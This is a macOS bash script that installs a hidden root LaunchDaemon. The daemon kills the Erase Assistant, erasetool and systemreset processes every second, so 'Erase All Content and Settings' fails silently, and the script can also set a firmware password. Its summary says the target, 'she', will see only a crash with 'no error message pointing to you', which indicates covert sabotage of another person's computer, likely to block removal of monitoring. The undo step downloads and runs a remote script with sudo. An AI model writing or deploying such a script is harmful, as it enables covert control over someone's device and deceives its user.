#!/bin/bash

# Lock Down Mac — Add Friction to Reset
# Installs a background daemon that kills the Erase Assistant process
# whenever it launches. The "Erase All Content and Settings" option
# looks totally normal — it just silently fails when clicked.
# To undo, run: sudo ./unlock-mac.sh
#
# Must be run with sudo.

RED='\033[1;31m'
GRN='\033[1;32m'
BLU='\033[1;34m'
YEL='\033[1;33m'
CYAN='\033[1;36m'
NC='\033[0m'

if [ "$(id -u)" -ne 0 ]; then
	echo -e "${RED}ERROR: This script must be run with sudo. Try: sudo ./lock-down-mac.sh${NC}" >&2
	exit 1
fi

echo ""
echo -e "${CYAN}╔═══════════════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║  Lock Down Mac — Block Factory Reset              ║${NC}"
echo -e "${CYAN}╚═══════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${BLU}This installs a background watcher that silently kills${NC}"
echo -e "${BLU}the erase process whenever it's launched. The reset${NC}"
echo -e "${BLU}option looks normal — it just doesn't work.${NC}"
echo ""

# ── Step 1: Create the watcher script ──
info() { echo -e "${BLU}ℹ $1${NC}"; }
success() { echo -e "${GRN}✓ $1${NC}"; }
warn() { echo -e "${YEL}WARNING: $1${NC}"; }

info "Installing erase blocker..."

cat > /usr/local/bin/block-erase.sh << 'SCRIPT'
#!/bin/bash
# Watches for Erase Assistant / erasetool and kills them immediately.
# Runs as a LaunchDaemon in the background.

while true; do
	# Kill Erase Assistant app
	pkill -f "Erase Assistant" 2>/dev/null
	# Kill erasetool
	pkill -f "erasetool" 2>/dev/null
	# Kill the system reset process
	pkill -f "systemreset" 2>/dev/null
	# Check every second
	sleep 1
done
SCRIPT

chmod +x /usr/local/bin/block-erase.sh
success "Created erase blocker script"

# ── Step 2: Create a LaunchDaemon to run it at boot ──
info "Installing LaunchDaemon..."

cat > /Library/LaunchDaemons/com.joneshipit.block-erase.plist << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Label</key>
	<string>com.joneshipit.block-erase</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/bash</string>
		<string>/usr/local/bin/block-erase.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
	<key>KeepAlive</key>
	<true/>
</dict>
</plist>
PLIST

# Set correct permissions
chown root:wheel /Library/LaunchDaemons/com.joneshipit.block-erase.plist
chmod 644 /Library/LaunchDaemons/com.joneshipit.block-erase.plist

success "Created LaunchDaemon"

# ── Step 3: Load the daemon now ──
info "Starting erase blocker..."
launchctl load -w /Library/LaunchDaemons/com.joneshipit.block-erase.plist 2>/dev/null
success "Erase blocker is running"

echo ""

# ── Step 4: Firmware / Recovery password (optional) ──
info "Checking Recovery Mode protection..."

cpu_brand=$(sysctl -n machdep.cpu.brand_string 2>/dev/null)
if echo "$cpu_brand" | grep -qi "apple"; then
	success "Apple Silicon — Recovery Mode requires user authentication by default"
else
	if command -v firmwarepasswd &>/dev/null; then
		fw_status=$(firmwarepasswd -check 2>/dev/null)
		if echo "$fw_status" | grep -qi "Yes"; then
			success "Firmware password already set"
		else
			echo ""
			echo -e "${CYAN}Set a firmware password? Prevents booting into Recovery${NC}"
			echo -e "${CYAN}to erase from there.${NC}"
			read -p "Set firmware password? (y/n): " set_fw
			if [ "$set_fw" = "y" ] || [ "$set_fw" = "Y" ]; then
				firmwarepasswd -setpasswd
				[ $? -eq 0 ] && success "Firmware password set" || warn "Could not set firmware password"
			fi
		fi
	fi
fi

echo ""

# ── Summary ──
echo -e "${GRN}╔═══════════════════════════════════════════════════╗${NC}"
echo -e "${GRN}║       Mac Locked Down Successfully!               ║${NC}"
echo -e "${GRN}╚═══════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${CYAN}How it works:${NC}"
echo -e "  • 'Erase All Content and Settings' looks totally normal"
echo -e "  • When clicked, the erase process starts and immediately dies"
echo -e "  • She'll just see it fail/crash — no error message pointing to you"
echo -e "  • The blocker runs silently in the background, survives reboots"
echo ""
echo -e "${CYAN}To undo (when she needs to actually reset):${NC}"
echo -e "  curl -L https://raw.githubusercontent.com/joneshipit/bypass-mdm-clean/main/unlock-mac.sh \\"
echo -e "    -o unlock-mac.sh && chmod +x unlock-mac.sh && sudo ./unlock-mac.sh"
echo ""
